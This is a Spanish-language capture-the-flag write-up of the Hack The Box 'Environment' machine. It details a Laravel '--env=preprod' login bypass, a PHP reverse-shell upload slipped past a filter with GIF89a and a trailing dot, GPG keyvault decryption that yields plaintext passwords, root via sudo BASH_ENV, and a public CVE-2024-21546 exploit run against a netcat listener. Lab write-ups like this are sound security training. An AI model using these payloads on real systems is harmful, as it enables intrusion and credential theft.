
# Environment

<figure><img src="/files/qF0UlN3wPbSe7ICqnXZz" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Environment`
* **IP:** `10.10.11.67`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `17/06/2025`

***

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.67` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.67 enviroment.htb" | sudo tee -a /etc/hosts
```

<figure><img src="/files/YPcFFMK8Ttkuv5AtRMdK" alt=""><figcaption></figcaption></figure>

Parece una web relacionada con el medio ambiente. La única funcionalidad que encontramos es la de añadir un email a la lista de espera, que da un fallo al poner un email inválido. Lo testamos pero no encontramos nada relevante.

<figure><img src="/files/dP1yVFb3P47zLapJq970" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -p- -sCV -Pn -T5 10.10.11.67
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Save the Environment | environment.htb
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos 2 puertos abiertos, el 22 y el 80, los típicos.

## <mark style="color:purple;">Fuzzing</mark>

```bash
gobuster dir -u http://environment.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,env --threads 50 -t 30

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://environment.htb
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.bak                 (Status: 403) [Size: 153]
/.txt                 (Status: 403) [Size: 153]
/.env                 (Status: 403) [Size: 153]
/index.php            (Status: 200) [Size: 4602]
/login                (Status: 200) [Size: 2391]
/upload               (Status: 405) [Size: 244852]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/up                   (Status: 200) [Size: 2126]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
/robots.txt           (Status: 200) [Size: 24]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/mailing              (Status: 405) [Size: 244854]
```

Encontramos algunos directorios interesantes:

* `login` - página de login
* `upload` - página de subida de archivos
* `storage` - posible directorio de almacenamiento de archivos subidos

### Login

Al acceder a `/login` accedemos a un panel de login, que al poner unas credenciales incorrectas nos da el mensaje "`Invalid credentials`". Probamos un bruteforce del login con hydra sin éxito

<figure><img src="/files/A8skksAASlKqGXd83I5p" alt=""><figcaption></figcaption></figure>

Al capturar un request del login con BurpSuite encontramos que se pasa un `XSRF-TOKEN` y un `laravel_session`:

<figure><img src="/files/I8hht3GnTrLLAtF0n52R" alt=""><figcaption></figcaption></figure>

Vemos que se envía de la siguiente manera:

```
POST /login HTTP/1.1
Host: environment.htb

_token=iOnmtEu4tA8tZqCunYeJztuBjO1nuGmP4MqCKeKO&email=admin%40environment.htb&password=1234&remember=False
```

### Upload

Al acceder a `/upload` nos encontramos un `Method Not Allowed` y algo aún más interesante, la versión de PHP `8.2.28` y `Laravel 11.30.0` con lo que podríamos buscar exploits públicos.

<figure><img src="/files/XUVqLJgr6FWBnCKz35On" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Enumeración de cabeceras</mark>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ curl -I http://environment.htb/
</strong>
HTTP/1.1 200 OK
Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Wed, 07 May 2025 10:26:37 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6ImlaMHdzM0tSU1l5U3kzeTFjMTlVakE9PSIsInZhbHVlIjoiZUE2YjN5eVJramdoMUdkZ1R5TWl4Y0pLNHZWaERZbllKSGR6Tnd6czJZQ2d4aGhUdE9Bb3BOc0hoRlJRYzZ0b1V1bU5xVjhyQXI4c0dzcmo2WUZPdjVzakZCeFZBZnBvdERFbk9GRXFsMlZuKzg4dXFKeTRyN2hML2JKRnZSRHYiLCJtYWMiOiJlN2FjYWE2M2IzMjJkOGNiZTA2YzFlZGExZmZmYWUwMzQwNGQzN2JhOGMzYzZmODRjM2ZiZDU3Zjc4NjYyMjA1IiwidGFnIjoiIn0%3D; expires=Wed, 07 May 2025 12:26:37 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IjV0cTVaTkFpUkJmekdOUlNuN0FTSXc9PSIsInZhbHVlIjoiTEhIZ0oyNE9vK3BBQnF5Ti9nM2djZXVQTWNQMDFyNnhkM1NUZWxhOFExSS9YeVNIMHRmSXAzOHNZdGIxcWh2aHE5TnhHZkpDbjNzWFdGcVEvcTlJZmJSam95dVBNSjYrWDZMYVpOelFJeXpSMGc3a1BhTHEyaW51Z244TE0ya3ciLCJtYWMiOiIxYzM0NDBlZmVmZTQ2NWI4NzNiOGJiMDU3MzllZjdjNGQyMzY5NmRjMTM1ZDhmMmJmMjFhOWI3ZjViNTkxM2FjIiwidGFnIjoiIn0%3D; expires=Wed, 07 May 2025 12:26:37 GMT; Max-Age=7200; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
</code></pre>

1. **Tecnologías identificadas**:
   * **Nginx 1.22.1** (Servidor web).
   * **Laravel** (Framework PHP, versión `11.30.0`).
   * **PHP 8.2.28** (Versión expuesta en el endpoint `/upload`).
2. **Cookies de sesión**:
   * `XSRF-TOKEN`: Token CSRF (usado para protección contra ataques Cross-Site Request Forgery).
   * `laravel_session`: Cookie de sesión autogestionada por Laravel (encriptada).
3. **Cabeceras de seguridad**:
   * `X-Frame-Options: SAMEORIGIN`: Protección contra clickjacking.
   * `X-Content-Type-Options: nosniff`: Evita MIME-sniffing.

## <mark style="color:purple;">**Env Bypass**</mark>

<figure><img src="/files/vcTi4LUWaIRVuDl8J9cT" alt=""><figcaption></figcaption></figure>

Analizando `web.php` en `/upload` encontramos que en la lógica, no hay ninguna situación `else` escrita:

```php
 if($remember == 'False') {
        $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
```

Así que intenta asignarle un valor aleatorio.

```
POST /login HTTP/1.1
Host: environment.htb

_token=JNCSO9ry4XvsQhVOhorOAtASyt4bQrqZAvy9paUx&email=a%40a.c&password=123&remember=111
```

<figure><img src="/files/b1UFPifmtLkc6ZJ0ySsl" alt=""><figcaption></figcaption></figure>

Y como vemos en la imagen anterior, significa que en **Laravel** , si el entorno actual es `"preprod"`(entorno de pre-producción), iniciará sesión automáticamente como `user_id = 1` y saltará a la página de administración en segundo plano.

Buscaremos una manera de explotarlo:

<figure><img src="/files/UoPczWw0iSdtwndICibl" alt=""><figcaption></figcaption></figure>

{% embed url="<https://github.com/Nyamort/CVE-2024-52301>" %}

Simplemente le pasamos los parámetros para hacer el bypass de env:

```
POST /login?--env=preprod HTTP/1.1
Host: environment.htb

_token=iOnmtEu4tA8tZqCunYeJztuBjO1nuGmP4MqCKeKO&email=a%40a.c&password=123&remember=True
```

Enviamos el request con BurpSuite y accedemos al panel de administración:

```
http://environment.htb/management/dashboard
```

<figure><img src="/files/0nDHvgHSynumGMRLlXrr" alt=""><figcaption></figcaption></figure>

Encontramos varios usuarios, pero la funcionalidad más interesante es que podemos subir una imagen de perfil, por lo que podríamos probar a subir una reverse shell:

<figure><img src="/files/7D2ad8Qmo8GJpIpYjcow" alt=""><figcaption></figcaption></figure>

### Generamos reverse shell

{% embed url="<https://www.revshells.com/>" %}

<figure><img src="/files/9N9LGaCzQUxJKeQwg3SR" alt=""><figcaption></figcaption></figure>

Al intentar subirla vemos que nos da un error, ya que no permite el tipo de archivo php:

<figure><img src="/files/3RqvnJk4oxLGFU4jtGwW" alt=""><figcaption></figcaption></figure>

### Bypass de subida de archivos php

Modificamos con BurpSuite la extensión del archivo a `phtml`, cambiamos el Content-Type a `image/jpg` y añadimos el MYME Type `GIF89a`, y nos deja subir la shell!

<figure><img src="/files/9XUbaczccqe0UEihmUU2" alt=""><figcaption></figcaption></figure>

Eso nos guarda la shel en la ruta:

```
/storage/files/shell.phtml
```

Sin embargo, al `acceder a la URL`, solo se descarga el archivo. Aquí, debemos añadir un punto al final para evitarlo.

```bash
Content-Disposition: form-data; name="_token"

XOqr2xIR9gadyFiPSBf7H8IgkDn0nSXD3BIjoPCU
-----------------------------21613416132803409862345788521
Content-Disposition: form-data; name="upload"; filename="shell.php."
Content-Type: image/jpg

GIF89a
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: 
```

Además descubrimos que no hace falta cambiar la extensión a `phtml`, sino que con añadir el . al final de php también hace el bypass.

<figure><img src="/files/tQYz2IM80auKF0LtVpH7" alt=""><figcaption></figcaption></figure>

Houston, tenemos una shell!

## User Flag

```shell-session
www-data@environment:/$ cd /home
cd /home
www-data@environment:/home$ ls
ls
hish
www-data@environment:/home$ cd hish
cd hish
www-data@environment:/home/hish$ ls
ls
backup
user.txt
www-data@environment:/home/hish$ cat user.txt
cat user.txt
e70cbc26310f4c6c1de9c53918fd3ad5
```

## Escalada de privilegios

En contramos un directorio `backup` muy interesante con un archivo `keyvault.gpg`:

```shell-session
www-data@environment:/home/hish$ ls
backup
user.txt

www-data@environment:/home/hish$ cd backup

www-data@environment:/home/hish/backup$ ls
keyvault.gpg
```

### Extraer keyvault.gpg

Dado que el usuario actual `www-data` no puede crear archivos en el directorio `/var/www`:

```shell-session
www-data@environment:/home/hish/backup$ gpg -d keyvault.gpg   

gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied
```

Le especificamos el directorio `/tmp`:

```shell-session
www-data@environment:/home/hish/backup$ cp -r /home/hish/.gnupg /tmp/mygnupg
www-data@environment:/home/hish/backup$ chmod -R 700 /tmp/mygnupg

www-data@environment:/home/hish/backup$ gpg --homedir /tmp/mygnupg --list-secret-keys   
<ckup$ gpg --homedir /tmp/mygnupg --list-secret-keys
/tmp/mygnupg/pubring.kbx
------------------------
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
ssb   rsa2048 2025-01-11 [E]

www-data@environment:/home/hish/backup$ gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg   
<essage.txt --decrypt /home/hish/backup/keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
```

Y leemos el `message.txt` en `/tmp`:

```shell-session
www-data@environment:/tmp$ cat message.txt

PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

Tenemos una contraseña en texto plano para el entorno de environment.htb! Cambiamos al usuario hish y ganamos una shell como este usuario:

```shell-session
www-data@environment:/home/hish/backup$ su hish
Password: marineSPm@ster!!

/bin/bash -i

hish@environment:~/backup$ id    
id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

### Permisos de ejecución

```shell-session
hish@environment:~/backup$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper

hish@environment:~/backup$ sudo -l -S
sudo -l -S
[sudo] password for hish: marineSPm@ster!!

Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

Se puede ver que las dos variables de entorno `env_keep` y `ENVBASH_ENV` se conservan y se pueden utilizar para escalar privilegios.

## <mark style="color:purple;">Root flag</mark>

```shell-session
hish@environment:~$ echo 'bash -p' > exp.sh
hish@environment:~$ chmod +x exp.sh 
hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo 

whoami
root

/bin/bash -i

root@environment:/home/hish# cd /root
root@environment:~# ls
root.txt
scripts

root@environment:~# cat root.txt
c6303494eeff2997d65f6489e1fd694b
```

## <mark style="color:purple;">Búsqueda de exploits</mark>

Buscando exploits de Laravel encontramos que es vulnerable al `CVE-2024-21546`, que permite a un atacante no autenticado subir una reverse shell y ganar RCE en el objetivo:

{% embed url="<https://github.com/ajdumanhug/CVE-2024-21546>" %}

Este script tiene como objetivo un Laravel File Manager vulnerable creado por UniSharp, que permite a usuarios no autenticados eludir restricciones de archivos y subir archivos maliciosos. Esto puede llevar a la ejecución remota de código (RCE) cuando se activa el payload subido.

El exploit realiza lo siguiente:

* Valida la `laravel_session` proporcionada por el usuario
* Extrae el `CSRF token` mediante expresiones regulares
* Sube un archivo PNG fake que contiene un payload de reverse shell en PHP
* Activa el payload subido

## <mark style="color:purple;">Explotación</mark>

Abrimos un listener de Netcat:

```bash
nc -nlvp 4444
```

Ejecutamos el exploit de la siguiente manera:

```bash
python3 CVE-2024-21546.py <target_url> <listener_ip> <listener_port> <laravel_session>
```

{% code overflow="wrap" %}

```
python3 CVE-2024-21546.py http://environment.htb 10.10.16.21 4444 eyJpdiI6IjV0cTVaTkFpUkJmekdOUlNuN0FTSXc9PSIsInZhbHVlIjoiTEhIZ0oyNE9vK3BBQnF5Ti9nM2djZXVQTWNQMDFyNnhkM1NUZWxhOFExSS9YeVNIMHRmSXAzOHNZdGIxcWh2aHE5TnhHZkpDbjNzWFdGcVEvcTlJZmJSam95dVBNSjYrWDZMYVpOelFJeXpSMGc3a1BhTHEyaW51Z244TE0ya3ciLCJtYWMiOiIxYzM0NDBlZmVmZTQ2NWI4NzNiOGJiMDU3MzllZjdjNGQyMzY5NmRjMTM1ZDhmMmJmMjFhOWI3ZjViNTkxM2FjIiwidGFnIjoiIn0%3D
```

{% endcode %}

<figure><img src="/files/HyM6ruyREL9cjDgw3eAL" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Conexión a base de datos</mark>

## <mark style="color:purple;">User flag</mark>

## <mark style="color:purple;">Escalada de privilegios</mark>
